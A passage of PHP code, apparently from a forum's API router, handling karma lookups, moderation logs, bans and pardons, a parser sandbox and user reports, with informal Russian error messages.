				if($user->isLogged()) {
					if(!isset($_REQUEST['comment_id']) || empty($_REQUEST['comment_id'])) {
						return $this->error('Не выбран коммент');
					}
					else {
						$commentExists = $comment->exists($_REQUEST['comment_id']);
						if($commentExists) {
							$onComment = $karma->onComment($_REQUEST['comment_id']);
							$countOnComment = $karma->countOnComment($_REQUEST['comment_id']);
							$result['count'] = $countOnComment;
							$result['advanced'] = $onComment;
							return $this->success($result);
						}
						else {
							return $this->error('Коммент не существует');
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'ofUser') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['username']) || empty($_REQUEST['username'])) {
						return $this->error('Юзер не выбран');
					}
					else {
						if(!$user->exists($_REQUEST['username'])) {
							return $this->error('Юзер не существуе');
						}
						else {
							$ofUser = $karma->ofUser($_REQUEST['username']);
							$countOfUser = $karma->countOfUser($_REQUEST['username']);
							$result['count'] = $countOfUser;
							$result['advanced'] = $ofUser;
							return $this->success($result);
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments['module'] == 'modlog') {
			if($method_segments['method'] == 'read') {
				if($user->isLogged()) {
					$modlog = new modlog();
					return $this->success($modlog->read());
				}
				else
				{
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments['module'] == 'ban') {
			$ban = new ban();
			if($method_segments['method'] == 'listInSub') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['sub']) || empty($_REQUEST['sub'])) {
						return $this->error('Не выбран раздел');
					}
					else {
						$list = $ban->listInSub($_REQUEST['sub']);
						foreach ($list as $key => $item) {
							$list[$key] = $parser->modifyBan($item);
						}
						return $this->success($list);
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'infoById') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['id'])) {
						return $this->error('Не выбран номер бана');
					}
					else {
						$info = $ban->byId($_REQUEST['id']);
						if(!isset($info) || empty($info)) {
							return $this->error('Бан не существует');
						}
						else {
							return $this->success($info[0]);
						}
					}
				} else {
					return $this->errorNoLogin();
				}
			}
			elseif($method_segments['method'] == 'pardon') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['id'])) {
						return $this->error('Какой бан снять?');
					}
					else {
						$banInfo = $ban->byId($_REQUEST['id'])[0];
						if(!$user->isModInSub($GLOBALS['username'], $banInfo['sub'])) {
							return $this->error('Не модератор');
						}
						elseif($ban->actual($banInfo)) {
							$ban->pardon($_REQUEST['id']);
							return $this->success('Разбанен');
						}
						else {
							return $this->error('Этот бан не актуален');
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
		}
		elseif($method_segments['module'] == 'sandbox') {
			if($method_segments['method'] == 'test') {
				if(!isset($_REQUEST['text']) || empty($_REQUEST['text'])) {
					return $this->error('Введите тексте!!1');
				}
				else {
					return $this->success($parser->parse($_REQUEST['text']));
				}
			}
		}
		elseif($method_segments['module'] == 'report') {
			$report = new report();
			$post = new post();
			$comment = new comment();
			$sub = new sub();
			if($method_segments['method'] == 'create') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['content_type']) || empty($_REQUEST['content_type'])) {
						return $this->error('На потс или комменте жалобу пилить?');
					}
					elseif(!isset($_REQUEST['content_id']) || empty($_REQUEST['content_id'])) {
						return $this->error('На что жалобу пилить?');
					}
					elseif(!in_array($_REQUEST['content_type'], $report->allowedContentTypes)) {
						return $this->error('Неправильно задан тип контента');
					}
					elseif(!isset($_REQUEST['reason']) || empty($_REQUEST['reason'])) {
						return $this->error('Введите причину жалобы');
					}
					else {
						if($_REQUEST['content_type'] == 'psto' || $_REQUEST['content_type'] == 'pots') {
							$contentType = 'post';
						}
						else {
							$contentType = $_REQUEST['content_type'];
						}
						/**
						 * Жалоба на пост
						 */
						if($contentType == 'post') {
							if(!$post->exists($_REQUEST['content_id'])) {
								return $this->error('Пост не существует');
							}
							else {
								$content = $post->info($_REQUEST['content_id'])[0];
								$isMod = $user->isModInSub($GLOBALS['username'], $content['sub']);
								if($isMod) {
									return $this->error('Вы и так модератор раздела');
								}
								elseif($report->exists($GLOBALS['username'], $contentType, $_REQUEST['content_id'], $content['sub'])) {
									return $this->error('Не надо срать репортами');
								}
								else {
									$report->create($GLOBALS['username'], $contentType, $_REQUEST['content_id'], $_REQUEST['reason'], $content['sub'], time());
									return $this->success('Стукачество совершено успешно');
								}
							}
						}
						elseif($contentType == 'comment') {
							if(!$comment->exists($_REQUEST['content_id'])) {
								return $this->error('Комменте не существуе');
							}
							else {
								$content = $comment->info($_REQUEST['content_id'])[0];
								$isMod = $user->isModInSub($GLOBALS['username'], $content['sub']);
								if($isMod) {
									return $this->error('Вы уже модератор раздела');
								}
								elseif($report->exists($GLOBALS['username'], $contentType, $_REQUEST['content_id'], $content['sub'])) {
									return $this->error('Не надо срать репортами');
								}
								else {
									$report->create($GLOBALS['username'], $contentType, $_REQUEST['content_id'], $_REQUEST['reason'], $content['sub'], time());
									return $this->success('Стукачество совершено успешно');
								}
							}
						}
					}
				}
				else {
					$this->errorNoLogin();
				}
			}
			elseif ($method_segments['method'] == 'inSub') {
				if($user->isLogged()) {
					if(!isset($_REQUEST['sub']) || empty($_REQUEST['sub'])) {
						return $this->error('Не выбран раздел');
					}
					else {
						if(!$sub->exists($_REQUEST['sub'])) {
							return $this->error('Раздел не существует');
						}
						else {
							if(!$user->isModInSub($GLOBALS['username'], $_REQUEST['sub'])) {
								return $this->error('Вы не модератор');
							}
							else {
								$reports = $report->inSub($_REQUEST['sub']);
								foreach ($reports as $key => $report) {
									$report = $parser->modifyReport($report);
									$reports[$key] = $report;
								}
								return $this->success($reports);
							}
						}
					}
				}
				else {
					return $this->errorNoLogin();
				}
			}
		}
		else
		{
			return $this->error_no_method();
		}
	}
}
?>